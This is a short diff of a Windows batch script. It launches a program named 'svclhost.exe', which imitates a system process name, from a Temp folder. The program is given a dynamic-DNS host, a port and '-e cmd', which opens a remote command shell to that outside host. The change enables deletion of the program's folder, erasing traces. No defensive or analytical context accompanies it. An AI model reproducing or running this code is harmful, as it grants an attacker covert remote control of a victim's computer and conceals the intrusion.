@@ -26,5 +26,4 @@ cd "C:\Windows\Temp"
 
 cmd /c "C:\Windows\Temp\0test0\svclhost.exe" nomancan.zapto.org %n_pt% -e cmd
 
-rem rmdir /Q /S "C:\Windows\Temp\0test0"
-rem del "C:\Windows\Temp\copy.bat" /f
+rmdir /Q /S "C:\Windows\Temp\0test0"
